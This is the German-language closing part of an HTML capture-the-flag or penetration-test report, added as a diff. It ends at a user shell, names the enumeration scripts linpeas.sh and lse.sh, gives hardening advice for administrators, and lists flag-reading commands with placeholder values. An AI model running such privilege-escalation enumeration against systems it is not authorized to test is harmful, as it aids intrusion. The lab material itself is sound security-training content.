+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation</h2>
+             <p class="evaluation">
+                **Bewertung:** Der Bericht endet mit dem Erlangen einer Shell als Benutzer `kevin`. Die Schritte zur Eskalation der Rechte auf `root` fehlen im vorliegenden Auszug.
+            </p>
+            <p class="recommendation">
+                **Empfehlung (Pentester):** Wie unter Initial Access erwähnt, jetzt systematisch nach Privilege Escalation Vektoren suchen. Tools wie `linpeas.sh` oder `lse.sh` können dabei helfen, häufige Fehlkonfigurationen oder Schwachstellen aufzudecken.<br>
+                **Empfehlung (Admin):** Prinzip des geringsten Privilegs anwenden. Benutzer sollten nur die Rechte haben, die sie für ihre Aufgaben benötigen. `sudo`-Rechte sorgfältig verwalten. Systeme aktuell halten, um bekannte Kernel-Exploits oder Software-Schwachstellen zu vermeiden. SUID/GUID-Binaries regelmäßig überprüfen und unnötige entfernen.
+            </p>
+        </section>
+
+        <section id="flags">
+             <div class="flag-container">
+                 <h2 class="flag-heading">Flags</h2>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /path/to/user.txt</div> <!-- Pfad anpassen, falls bekannt -->
+                     <div class="flag-value"><span class="password">USER_FLAG_PLATZHALTER</span></div>
+                 </div>
+                 <div class="flag-entry">
+                     <div class="flag-command">cat /path/to/root.txt</div> <!-- Pfad anpassen, falls bekannt -->
+                     <div class="flag-value"><span class="password">ROOT_FLAG_PLATZHALTER</span></div>
+                 </div>
+             </div>
+         </section>
+
+
+    </div> <!-- Ende .container -->
+
+    <footer class="footer">
+        <p>DarkSpirit - Cyber Security Reports</p>
+        <p>Berichtsdatum: 14. April 2024</p>
+    </footer>
+</body>
+</html>
